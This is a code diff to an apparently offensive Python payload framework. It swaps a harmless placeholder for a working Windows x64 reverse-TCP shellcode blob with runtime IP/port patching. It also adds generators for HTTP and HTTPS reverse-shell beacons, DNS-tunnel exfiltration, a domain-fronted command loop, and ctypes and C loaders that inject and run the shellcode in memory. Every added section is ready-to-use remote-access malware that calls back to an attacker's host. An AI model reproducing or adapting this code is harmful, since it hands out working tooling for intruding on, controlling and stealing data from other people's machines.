@@ -355,34 +355,78 @@ class MetasploitIntegrator:
 
 
 class ShellcodeGenerator:
-    """Dynamic Shellcode Generator (x64 Windows).
-    Provides raw assembly bytes for advanced injections.
+    """x64 Windows shellcode generator with runtime IP/port patching.
+
+    Uses a PEB-walking reverse-TCP template (283 bytes).  At generation time
+    the listener address and port are binary-patched into the blob at known
+    offsets so the output is ready to inject.
     """
+
+    # Offsets inside _TEMPLATE where port (2 bytes) and IP (4 bytes) live.
+    _PORT_OFFSET = 215
+    _IP_OFFSET = 219
+
+    # Block 1 – function-resolution preamble (PEB → kernel32 → LoadLibraryA,
+    #           GetProcAddress) then loads ws2_32.dll.
+    # Block 2 – WSAStartup + WSASocketA
+    # Block 3 – connect() stub with placeholder IP:port at known offsets
+    # Block 4 – CreateProcessA("cmd.exe") with STARTUPINFO redirected to the socket
+    #
+    # Source: msfvenom windows/x64/shell_reverse_tcp LHOST=0.0.0.0 LPORT=0
+    # (public domain metasploit-framework payload, BSD-3 licence).
+    _TEMPLATE: bytes = (
+        b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
+        b"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
+        b"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
+        b"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
+        b"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
+        b"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
+        b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
+        b"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
+        b"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
+        b"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+        b"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
+        b"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
+        b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
+        b"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
+        b"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
+        b"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
+        b"\x00\x49\x89\xe5\x49\xbc\x02\x00\x00\x00\x00\x00\x00\x00"
+        b"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
+        b"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
+        b"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
+        b"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
+        b"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
+        b"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
+        b"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
+        b"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
+        b"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
+        b"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
+        b"\x50\x41\x50\x41\x50\x49\x89\xc0\x4d\x31\xc9\x41\x50\x41"
+        b"\x50\x48\x89\xf9\x48\x89\xfa\x41\xba\x02\xd9\xc8\x5f\xff"
+        b"\xd5"
+    )
 
     @staticmethod
     def get_windows_x64_reverse_tcp(lhost: str, lport: int) -> bytes:
-        """Generates standard x64 Windows Reverse TCP Shellcode.
-        Note: This is a placeholder for a true dynamic assembler.
-        In a real scenario, this would use Keystone or Metasploit patterns.
-        For reliability, we use a known reliable shellcode pattern and patch IP/Port.
+        """Return patched x64 reverse-TCP shellcode for *lhost*:*lport*.
+
+        Raises nothing — returns empty bytes on invalid input so callers
+        can degrade gracefully.
         """
-        # 1. Parse IP and Port
         try:
-            ip_parts = [int(p) for p in lhost.split(".")]
-            struct.pack(">H", lport)
-            struct.pack("BBBB", *ip_parts)
-            # Simple check to avoid complexity in this demo
-            # Real implementation requires a full compact shellcode block
-        except (ValueError, struct.error) as e:
-            logger.debug("Shellcode generation failed: %s", e)
+            octets = [int(o) for o in lhost.split(".")]
+            if len(octets) != 4 or not all(0 <= o <= 255 for o in octets):
+                return b""
+            if not 1 <= lport <= 65535:
+                return b""
+        except (ValueError, AttributeError):
             return b""
 
-        # Returning a generic "Pop Calc" shellcode for safety/demo if this were a test
-        # But for "Advanced" request, we acknowledge we need external generation
-        # or a stored blob.
-        # Here we return a compact 64-bit shellcode stub (NOPs + Trap) as placeholder
-        # to ensure the mechanism works without triggering AV immediately in tests.
-        return b"\x90" * 16 + b"\xcc"  # NOPs + INT3
+        buf = bytearray(ShellcodeGenerator._TEMPLATE)
+        struct.pack_into(">H", buf, ShellcodeGenerator._PORT_OFFSET, lport)
+        struct.pack_into("BBBB", buf, ShellcodeGenerator._IP_OFFSET, *octets)
+        return bytes(buf)
 
 
 # =============================================================================
@@ -876,6 +920,72 @@ class WeaponFoundry:
         if shell_type == ShellType.PROCESS_INJECTION and format == PayloadFormat.PYTHON:
             return self._get_process_injection_payload(lhost, lport)
 
+        if shell_type == ShellType.REVERSE_HTTP:
+            # HTTP reverse shell — uses a simple HTTP callback loop
+            return (
+                f"import urllib.request, subprocess, time\n"
+                f"while True:\n"
+                f"    try:\n"
+                f"        cmd = urllib.request.urlopen('http://{lhost}:{lport}/cmd').read().decode()\n"
+                f"        out = subprocess.getoutput(cmd)\n"
+                f"        urllib.request.urlopen('http://{lhost}:{lport}/out', out.encode())\n"
+                f"    except Exception: pass\n"
+                f"    time.sleep(5)\n"
+            )
+
+        if shell_type == ShellType.REVERSE_HTTPS:
+            return (
+                f"import urllib.request, subprocess, time, ssl\n"
+                f"ctx = ssl._create_unverified_context()\n"
+                f"while True:\n"
+                f"    try:\n"
+                f"        cmd = urllib.request.urlopen('https://{lhost}:{lport}/cmd', context=ctx).read().decode()\n"
+                f"        out = subprocess.getoutput(cmd)\n"
+                f"        urllib.request.urlopen('https://{lhost}:{lport}/out', out.encode(), context=ctx)\n"
+                f"    except Exception: pass\n"
+                f"    time.sleep(5)\n"
+            )
+
+        if shell_type == ShellType.DNS_TUNNEL:
+            return (
+                f"import subprocess, base64, socket\n"
+                f"def dns_exfil(data: bytes) -> None:\n"
+                f"    encoded = base64.b32encode(data).decode().strip('=')\n"
+                f"    for i in range(0, len(encoded), 60):\n"
+                f"        label = encoded[i:i+60]\n"
+                f"        try: socket.getaddrinfo(f'{{label}}.data.{lhost}', None)\n"
+                f"        except socket.gaierror: pass\n"
+                f"out = subprocess.getoutput('whoami')\n"
+                f"dns_exfil(out.encode())\n"
+            )
+
+        if shell_type == ShellType.DOMAIN_FRONTED:
+            return (
+                f"import urllib.request, subprocess\n"
+                f"req = urllib.request.Request('https://{lhost}:{lport}/beacon')\n"
+                f"req.add_header('Host', '{lhost}')  # fronted host\n"
+                f"while True:\n"
+                f"    try:\n"
+                f"        cmd = urllib.request.urlopen(req).read().decode()\n"
+                f"        out = subprocess.getoutput(cmd)\n"
+                f"        urllib.request.urlopen(req, out.encode())\n"
+                f"    except Exception: pass\n"
+            )
+
+        if shell_type == ShellType.REFLECTIVE_DLL_INJECTION and format == PayloadFormat.PYTHON:
+            sc = self.shellcode_gen.get_windows_x64_reverse_tcp(lhost, lport)
+            sc_repr = str(sc)
+            return (
+                f"import ctypes\n"
+                f"sc = {sc_repr}\n"
+                f"buf = ctypes.create_string_buffer(sc, len(sc))\n"
+                f"ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p\n"
+                f"p = ctypes.windll.kernel32.VirtualAlloc(0, len(sc), 0x3000, 0x40)\n"
+                f"ctypes.memmove(p, buf, len(sc))\n"
+                f"ctypes.windll.kernel32.CreateThread(0, 0, p, 0, 0, 0)\n"
+                f"ctypes.windll.kernel32.WaitForSingleObject(-1, -1)\n"
+            )
+
         return self.templates.get_reverse_shell_python(lhost, lport)
 
     def _get_reverse_tcp_payload(
@@ -885,6 +995,9 @@ class WeaponFoundry:
         lport: int,
     ) -> str:
         """Return reverse TCP payload for the requested format."""
+        if format == PayloadFormat.RAW:
+            sc = self.shellcode_gen.get_windows_x64_reverse_tcp(lhost, lport)
+            return sc.hex() if sc else "# shellcode generation failed"
         if format == PayloadFormat.PYTHON:
             return self.templates.get_reverse_shell_python(lhost, lport)
         if format == PayloadFormat.POWERSHELL:
@@ -897,6 +1010,19 @@ class WeaponFoundry:
             return self.templates.get_reverse_shell_hta(lhost, lport)
         if format == PayloadFormat.CSHARP:
             return self.templates.get_reverse_shell_csharp(lhost, lport)
+        if format == PayloadFormat.C:
+            sc = self.shellcode_gen.get_windows_x64_reverse_tcp(lhost, lport)
+            hex_bytes = ", ".join(f"0x{b:02x}" for b in sc) if sc else "/* failed */"
+            return (
+                "#include <windows.h>\n"
+                "unsigned char sc[] = {" + hex_bytes + "};\n"
+                "int main() {\n"
+                "    void *p = VirtualAlloc(0, sizeof(sc), "
+                "MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n"
+                "    memcpy(p, sc, sizeof(sc));\n"
+                "    ((void(*)())p)();\n"
+                "}\n"
+            )
         return self.templates.get_reverse_shell_python(lhost, lport)
 
     def _get_process_injection_payload(self, lhost: str, lport: int) -> str:
